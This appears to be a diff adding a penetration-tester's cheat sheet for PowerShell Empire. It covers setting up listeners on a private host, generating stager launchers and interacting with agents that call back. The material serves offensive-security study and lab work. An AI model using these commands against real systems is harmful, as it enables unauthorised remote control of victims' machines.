@@ -1,0 +1,53 @@
+--------------------------------------------------------------------PS setup-----------------------------------------------------------------------------------------
+#Server Window
+sudo powershell-empire server
+
+
+#Client Window
+sudo powershell-empire client
+connect -c localhost
+
+#enter main context
+main
+
+--------------------------------------------------------------------listeners-----------------------------------------------------------------------------------------
+#enter listeners context and also view active listeners
+listeners
+
+#assign listener
+uselistener <tab>		//show listener types
+uselistener <http>
+
+options				//show current listener options
+listeners or list		//view active listeners from listeners context
+
+set Host http://192.168.26.142:8081	//set host and listener type 
+set Port 8081
+
+#for https
+/usr/share/powershell-empire/setup/cert.sh	//generate self-signed cert to ./data/empire.pem
+set CertPath <pem location>			//assign certpath for https listener
+
+set defaultJitter				//assign agent reachback interval jitter 0.0 to 1.0
+set Name 					//set listener name
+set WorkingHours				//active time for agent to operate
+
+#execute listener
+execute
+
+
+--------------------------------------------------------------------stagers-------------------------------------------------------------------------------------------
+#enter stager context from main, listener or agents menu
+usestager <tab>		//show stager types for selection
+set Listener <active listener name>	//associates staget to built and running listener
+
+#generate launcher
+generate
+
+
+
+--------------------------------------------------------------------agents--------------------------------------------------------------------------------------------
+#interact with agent upon notification
+agents
+interact <agent name>			//interact with agent session
+
